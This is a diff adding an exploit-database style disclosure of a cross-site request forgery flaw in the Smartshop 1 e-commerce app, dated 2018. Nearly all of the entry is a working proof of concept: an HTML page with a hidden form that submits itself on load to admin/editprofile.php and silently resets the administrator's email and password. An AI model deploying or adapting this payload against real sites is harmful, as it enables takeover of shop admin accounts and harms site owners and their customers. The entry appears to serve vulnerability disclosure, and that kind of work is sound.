@@ -1,0 +1,31 @@
+# Exploit Title: Smartshop 1 - Cross site request forgery
+# Date: 2018-06-02
+# Exploit Author: L0RD or borna.nematzadeh123@gmail.com
+# Software Link: https://github.com/smakosh/Smartshop/archive/master.zip
+# Vendor Homepage: https://www.behance.net/gallery/49080415/Smartshop-Free-e-commerce-website
+# Version: 1
+# Tested on: Kali linux
+=================================================
+
+# POC : CSRF
+
+# Exploit :
+# vulnerable file : editprofile.php
+
+<html>
+<head>
+   <title>Change admin password</title>
+</head>
+<body>
+   <form method="POST" action="http://127.0.0.1/clone/Smartshop-master/admin/editprofile.php">
+    <input type="hidden" name="email" value="decode@test.com">
+    <input type="hidden" name="password" value="1234">
+    <input type="hidden" name="confirmation" value="1234">
+   </form>
+ <script>
+    document.forms[0].submit();
+ </script>
+</body>
+</html>
+
+==================================================
